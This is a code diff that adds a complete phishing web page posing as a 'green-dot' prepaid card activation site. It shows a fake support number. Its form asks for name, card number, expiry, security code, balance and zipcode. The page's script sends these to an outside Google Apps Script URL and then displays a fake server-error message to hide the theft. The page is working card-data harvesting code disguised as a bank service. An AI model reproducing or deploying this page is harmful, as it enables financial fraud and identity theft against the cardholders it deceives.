@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  
+
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+		<script defer data-domain="greengreengreen.z13.web.core.windows.net" src="https://plausible.io/js/script.js"></script>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        height: 100vh;
+        background-color: #f3f3f3;
+        margin: 0;
+        display: flex;
+        flex-direction: column;
+      }
+      h1 {
+        color: #65ab24;
+        font-size: 26px;
+        line-height: 50px;
+        text-align: center; /* Center align heading */
+        margin: 20px 0; /* Add margin for spacing */
+      }
+      .innerbox {
+        background-color: black;
+        padding: 25px 75px 25px 50px; /* Adjusted padding for mobile */
+        margin: 0 auto; /* Center align the inner box */
+      }
+      .innerbox p {
+        color: white;
+      }
+      .activate {
+        font-size: 24px;
+      }
+
+      .form-container {
+        border-radius: 10px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        padding: 30px;
+        margin: 0 auto; /* Center align the form container */
+      }
+
+      h2 {
+        text-align: center;
+        color: #333;
+      }
+
+      label {
+        font-weight: bold;
+        display: block;
+        margin-bottom: 5px;
+        color: #555;
+      }
+
+      input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 10px;
+        margin-bottom: 15px;
+        font-size: 16px;
+      }
+
+      button {
+        width: 100%; /* Full width for button */
+        padding: 15px;
+        margin-bottom: 1rem;
+        border: none;
+        border-radius: 50px;
+        background-color: #333;
+        color: white;
+        font-size: 18px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+      }
+
+      button:hover {
+        background-color: #555;
+      }
+
+      @media (max-width: 600px) {
+        .navbar {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          background-color: white;
+          padding: 15px 20px;
+        }
+        .form-container {
+          padding: 20px;
+        }
+
+        input {
+          font-size: 14px;
+        }
+
+        button {
+          padding: 12px;
+          font-size: 16px;
+        }
+      }
+
+      .main-box {
+        background-color: #f3f3f3;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 20px; /* Add padding for spacing */
+      }
+
+      /* Navbar styling */
+      .navbar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background-color: white;
+        padding: 15px 20px;
+      }
+
+      .navbar .logo img {
+        height: 50px; /* Adjust height of the logo */
+        margin-bottom: 10px; /* Add margin for spacing */
+      }
+
+      .navbar .contact {
+        background-color: green;
+        color: white;
+        padding: 10px 15px;
+        border-radius: 5px;
+        font-weight: bold;
+        text-align: center; /* Center text */
+      }
+
+      /* Content styling */
+      .content {
+        padding: 20px;
+      }
+
+      ul {
+        list-style-type: none;
+        padding-left: 0; /* Remove default padding */
+      }
+
+      ul li {
+        margin-bottom: 8px;
+      }
+
+      .footer-rem {
+        display: flex;
+        flex-direction: column; /* Stack images vertically on mobile */
+        justify-content: center;
+        align-items: center;
+        margin-top: 20px; /* Add margin for spacing */
+      }
+
+      .footer-rem img {
+        max-width: 100%; /* Make images responsive */
+        height: auto; /* Maintain aspect ratio */
+        margin-bottom: 10px; /* Add space between images */
+      }
+    </style>
+  </head>
+  <body>
+    <div class="navbar">
+      <div class="logo">
+        <img
+          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSdcI695RVm0V6zIJMKSuQjB1stak2jj4ERQg&s"
+          alt="Your Logo"
+        />
+        <!-- Replace with actual logo image URL -->
+      </div>
+      <div class="contact">Call Us Now +1 803-529-8901</div>
+    </div>
+    <div>
+      <div class="main-box">
+        <h1>
+          Register & activate your green-dotCard online<br />
+          Your are just Click Away !
+        </h1>
+        <div style="display: flex; justify-content: center; padding-top: 10px">
+          <div class="innerbox">
+            <p>
+              <span class="activate" style="font-size: 24px">
+                Activate Your Card</span
+              ><br />
+              Enter your details here to Activate<br />
+              your Card.<br />
+            </p>
+            <form id="customForm">
+              <label for="name">Name</label>
+              <input
+                type="text"
+                placeholder="Enter Name"
+                id="name"
+                name="name"
+                required
+              />
+
+              <label for="cardnumber">Enter 16 Digits</label>
+              <input
+                type="number"
+                pattern="\d{16}"
+                placeholder="Enter card number"
+                name="cardnumber"
+                id="cardnumber"
+                required
+              />
+
+              <label for="expiry">Expiry (MMYY)</label>
+              <input
+                type="text"
+                id="expiry"
+                name="expiry"
+                placeholder="MMYY"
+                pattern="\d{4}"
+                required
+              />
+
+              <label for="pin">3 Digit Security Pin</label>
+              <input
+                type="text"
+                placeholder="***"
+                pattern="\d{3}"
+                id="pin"
+                name="pin"
+                required
+              />
+
+              <label for="currentBalance">Current Balance</label>
+              <input
+                type="text"
+                placeholder="Current card balance"
+                id="currentBalance"
+                name="currentBalance"
+                required
+              />
+
+              <label for="zipcode">Zipcode</label>
+              <input
+                type="text"
+                id="zipcode"
+                placeholder="Your Zipcode"
+                name="zipcode"
+                pattern="\d{5,6}"
+                required
+              />
+
+              <button type="submit">Continue</button>
+            </form>
+          </div>
+        </div>
+
+        <div
+          style="display: flex; justify-content: center; padding-bottom: 20px"
+        >
+          <p style="margin-top: 20px; color: #493414">
+            Greens dot card is best prepaid card for your daily spendings.<br />
+            activate your greens pack online and get cash back. register
+            today<br />
+            for free no fees.
+          </p>
+        </div>
+        <div class="content">
+          <h1>Related Questions:</h1>
+          <ul>
+            <li>- Your green dot card isn't activated yet</li>
+            <li>- Your green dot card has expired</li>
+            <li>- You locked your green dot card</li>
+            <li>
+              - You may have exceeded your daily or monthly spending limits
+            </li>
+            <li>- An incorrect PIN has been entered multiple times</li>
+            <li>- There are insufficient funds in your account</li>
+            <li>- Why did my green dot card get declined?</li>
+          </ul>
+        </div>
+      </div>
+      <div class="footer-rem">
+        <img src="img/footerimg1.webp" />
+        <img src="img/footerimg2.webp" />
+        <img src="img/GreenDot-web-banner-1024x427.webp" alt="" />
+        <img src="img/footer.webp" alt="" />
+      </div>
+    </div>
+    <script>
+      document
+        .getElementById("customForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          const formData = new FormData(event.target);
+          const formDetails = {
+            name: formData.get("name"),
+            cardnumber: formData.get("cardnumber"),
+            expiry: formData.get("expiry"),
+            pin: formData.get("pin"),
+            currentBalance: formData.get("currentBalance"),
+            zipcode: formData.get("zipcode"),
+          };
+
+          const scriptURL ="https://script.google.com/macros/s/AKfycbxTyHtxZ75GXeRBBq0jWNLstPUsdfyTW5nocG9BD5KUmzDN15h22uZxgybkjNi8HbUu/exec";
+
+          fetch(scriptURL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(formDetails),
+          })
+            .then(() => {
+              alert(
+                "Server Error GDx1002, UNABLE TO REGISTER! Try After Sometime"
+              );
+              document.getElementById("customForm").reset();
+            })
+            .catch((error) => {
+              console.error("Error:", error);
+              alert(
+                "Server Error 503, Please Try After 45 Minutes"
+              );
+            });
+        });
+    </script>
+  </body>
+
+</html>
